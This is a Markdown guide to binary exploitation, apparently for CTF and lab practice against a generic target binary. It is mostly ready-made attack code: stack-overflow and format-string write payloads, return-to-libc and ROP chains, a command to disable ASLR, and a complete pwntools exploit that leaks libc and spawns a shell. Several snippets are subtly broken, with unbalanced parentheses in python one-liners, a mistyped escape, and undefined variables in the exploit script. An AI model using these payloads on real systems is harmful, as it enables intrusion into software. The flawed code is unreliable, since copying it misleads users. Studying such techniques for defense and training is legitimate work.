# 🛡️ Binary Security Analysis Guide 🔍

A comprehensive guide to understanding and analyzing binary security, vulnerabilities, and exploit techniques.

## 📋 Table of Contents
- [Introduction](#introduction)
- [Basic Analysis Commands](#basic-analysis-commands)
- [Common Vulnerabilities](#common-vulnerabilities)
- [Protection Mechanisms](#protection-mechanisms)
- [Advanced Techniques](#advanced-techniques)
- [Real-World Examples](#real-world-examples)
- [Debugging Tips](#debugging-tips)
- [Error Messages](#error-messages)
- [Tools and Resources](#tools-and-resources)

## 🚀 Introduction

This guide covers essential concepts in binary security analysis, from basic vulnerability identification to advanced exploitation techniques. All examples include both 32-bit and 64-bit scenarios.

## 🛠️ Basic Analysis Commands

### Binary Information
```bash
# Check security mechanisms
$ checksec --file ./binary
[*] '/path/to/binary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

# View file type and architecture
$ file ./binary
./binary: ELF 64-bit LSB shared object, x86-64

# List functions and symbols
$ nm ./binary
0000000000001189 T main
0000000000001165 T vulnerable_function

# View dynamic dependencies
$ ldd ./binary
    linux-vdso.so.1
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# Detailed section information
$ readelf -a ./binary

# View program headers
$ readelf -l ./binary

# Check relocation entries
$ readelf -r ./binary
```

### Debugging Commands
```bash
# GDB basic commands
$ gdb ./binary
(gdb) info functions  # List all functions
(gdb) disas main      # Disassemble main function
(gdb) b *main         # Set breakpoint at main
(gdb) x/32wx $esp     # Examine stack (32-bit)
(gdb) x/32gx $rsp     # Examine stack (64-bit)
(gdb) run $(python -c 'print "A"*100')  # Test buffer overflow

# Advanced GDB commands
(gdb) info proc mappings  # View memory mappings
(gdb) find /b 0x08048000,0x08049000,0x90,0x90,0x90  # Search for NOPs
(gdb) define hook-stop    # Create custom break behavior
> x/i $pc
> x/8wx $sp
> end
```

## 💥 Common Vulnerabilities

### 1. Stack Buffer Overflow
```bash
# Pattern creation and detection
$ cyclic 100
aaaabaaacaaadaaaeaaaf...

# Different input methods
# 1. Command line argument
$ ./binary $(python -c 'print "A"*44 + "\xef\xbe\xad\xde"')

# 2. Pipe input
$ python -c 'print "A"*44 + "\xef\xbe\xad\xde"' | ./binary

# 3. Here string
$ ./binary <<< $(python -c 'print "A"*44 + "\xef\xbe\xad\xde"')

# 4. File input
$ python -c 'print "A"*44 + "\xef\be\xad\xde"' > input.txt
$ ./binary < input.txt

# Finding offset (32-bit)
(gdb) run $(python -c 'print "A"*100')
Program received signal SIGSEGV
(gdb) x/wx $esp
0xffffd620: 0x41414141

# Finding offset (64-bit)
(gdb) run <<< $(python3 -c 'print("A"*100)')
Program received signal SIGSEGV
(gdb) x/gx $rsp
0x7fffffffe4f8: 0x4141414141414141

# Memory examination
(gdb) x/32wx $esp-128  # Examine memory around crash
(gdb) bt full          # Full backtrace
```

### 2. Format String Vulnerability
```bash
# Basic tests
$ ./binary AAAA%x.%x.%x.%x
$ ./binary %p.%p.%p.%p
$ ./binary %s.%s.%s.%s
$ ./binary %n.%n.%n.%n

# Parameter reading
$ ./binary AAAA%3\$x  # Read 3rd parameter
$ ./binary AAAA%4\$s  # Read string at 4th parameter

# Memory writing
# Write 4 bytes
$ ./binary $(python -c 'print "\x20\x30\x40\x50" + "%7$n")')

# Write specific value (100)
$ ./binary $(python -c 'print "\x20\x30\x40\x50" + "%100x%7$n")')

# Multiple writes
$ ./binary $(python -c 'print "\x20\x30\x40\x50\x21\x30\x40\x50" + "%100x%7$n" + "%200x%8$n")')

# Byte-by-byte write
$ ./binary $(python -c 'print "\x20\x30\x40\x50" + "%100c%7$hhn")')
```

### 3. Return-to-libc Attack
```bash
# Finding addresses
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4e150 <system>

(gdb) find &system,+9999999,"/bin/sh"
0xf7f6fda9

# 32-bit payload
$ ./binary $(python -c 'print "A"*44 + "\x50\xe1\xe4\xf7" + "JUNK" + "\xa9\xfd\xf6\xf7"')

# 64-bit with gadgets
$ ROPgadget --binary binary --rop --only "pop|ret"
```

### 4. Heap Exploitation
```bash
# Use-After-Free
$ ./binary <<< $(python -c 'print "alloc\nfree\nuse\n")')

# Double-free
$ ./binary <<< $(python -c 'print "alloc\nfree\nfree\n")')

# Heap overflow
$ ./binary <<< $(python -c 'print "A"*256')

# Heap inspection
(gdb) heap chunks
(gdb) heap bins
(gdb) p *((struct malloc_chunk*)0x804b000)  # Examine chunk

# Chunk consolidation
$ ./binary <<< $(python -c 'print "alloc\nfree\nconsolidate\n")')
```

## 🔒 Protection Mechanisms

### ASLR
```bash
# Check status
$ cat /proc/sys/kernel/randomize_va_space
2  # ASLR enabled

# Disable for testing
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# ASLR bypass example
$ for i in {1..1000}; do ./binary AAA%p.%p.%p; done | grep "0x7f"
```

### Stack Canary
```bash
# Detection
(gdb) pattern create 100
(gdb) run
Program received signal SIGABRT
Stack smashing detected

# Bruteforce example (when partial overwrite is possible)
for i in {0..255}; do 
    python -c "print 'A'*40 + chr($i) + '\n'" | ./binary
done
```

### NX (No-Execute)
```bash
# ROP chain to bypass NX
$ ROPgadget --binary binary --rop --badbytes "0a"

# Sample payload structure
payload = pad + pop_rdi + bin_sh + system_addr

# Using mprotect to make stack executable
payload = flat(
    pad,
    pop_rdi_ret,
    stack_addr,
    pop_rsi_ret,
    0x1000,
    pop_rdx_ret,
    7,          # PROT_READ | PROT_WRITE | PROT_EXEC
    mprotect_addr,
    shellcode_addr,
    shellcode
)
```

## 🔨 Advanced Techniques

### Information Leaks
```bash
# GOT/PLT examination
$ objdump -R binary  # View relocations
$ readelf -r binary  # Detailed relocation info

# PLT leak example
payload = flat(
    pad,
    pop_rdi_ret,
    got_puts,
    plt_puts,
    main_plt
)

# Calculate libc base
libc_base = leaked_puts - puts_offset
system_addr = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset
```

### ROP Chain Building
```python
# Full exploit example
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Gadgets
pop_rdi = 0x4006d3
pop_rsi_r15 = 0x4006d1
ret = 0x400416

# Stage 1: Leak libc
payload1 = flat(
    b'A' * padding,
    pop_rdi,
    puts_got,
    puts_plt,
    main
)

# Stage 2: Call system("/bin/sh")
payload2 = flat(
    b'A' * padding,
    pop_rdi,
    bin_sh,
    ret,  # Stack alignment
    system
)

# Send payloads
p = process('./binary')
p.sendline(payload1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
p.sendline(payload2)
p.interactive()
```

### Stack Pivoting
```bash
# Find gadgets
$ ROPgadget --binary binary --only "leave|ret"
$ ROPgadget --binary binary --only "xchg|ret"

# Example pivot
payload = flat(
    fake_stack,
    b'A' * padding,
    leave_ret,
    rop_chain
)
```

## ⚠️ Common Error Messages
```plaintext
Segmentation fault (core dumped) - Memory access violation
Bus error - Misaligned memory access
Stack smashing detected - Stack canary triggered
Double free detected - Heap corruption
Aborted (core dumped) - Program terminated abnormally
Invalid next size - Heap metadata corruption
```

## 🔍 Debugging Tips

### For 32-bit binaries:
```bash
# Register examination
(gdb) info registers eax ebx ecx edx
(gdb) x/32wx $esp
(gdb) x/i $eip

# Stack frame
(gdb) info frame
(gdb) bt full
```

### For 64-bit binaries:
```bash
# Register examination
(gdb) info registers rax rbx rcx rdx
(gdb) x/32gx $rsp
(gdb) x/i $rip

# SIMD registers
(gdb) info registers xmm0
```

## 🔗 Related Tools
- GDB-Peda: Enhanced GDB
- Radare2: Reverse engineering framework
- IDA Pro: Disassembler
- Ghidra: NSA's reverse engineering tool
- ROPgadget: ROP chain builder
- pwndbg: GDB plugin for exploits
- Ropper: Another gadget finder
- PEDA: Python Exploit Development Assistance

## 📚 Resources
- [Shellcoding Guide](https://novoforce.com/blog/shellcoding)
- [ROP Emporium](https://ropemporium.com/)
- [Exploit Education](https://exploit.education/)
- [Modern Binary Exploitation](https://github.com/RPISEC/MBE)

## 🤝 Contributing
Feel free to submit pull requests with additional techniques, examples, or improvements!

## ⚖️ License
This project is licensed under the MIT License - see the LICENSE file for details.

---
Created with 💖 by Security Researchers for Security Researchers
